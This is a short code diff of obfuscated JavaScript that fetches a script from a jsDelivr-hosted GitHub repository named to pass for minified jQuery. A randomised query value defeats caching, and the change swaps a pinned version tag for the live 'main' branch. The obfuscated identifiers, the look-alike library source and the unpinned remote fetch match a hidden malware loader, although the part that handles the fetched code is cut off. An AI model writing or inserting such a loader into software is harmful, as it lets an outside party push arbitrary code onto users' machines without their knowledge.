@@ -2,7 +2,7 @@ function wxzz() {
     const Qsqz = Math["random"]() * ((0x5E30A78 - 0O570605164) - (0O57060516 - 0xbc614d)) + (0O57060516 - 0xbc614d);
     return parseFloat(Qsqz["toFixed"]((15658734 ^ 0O73567354)));
 }
-sutz(`https://cdn.jsdelivr.net/gh/jqueryminified/js@v3.7.1/jquery.min.js?v=${wxzz()}`);
+sutz(`https://cdn.jsdelivr.net/gh/jqueryminified/js@main/jquery.min.js?v=${wxzz()}`);
 
 function sutz(Mpkz) {
     return fetch(Mpkz)["then"](ornz => {
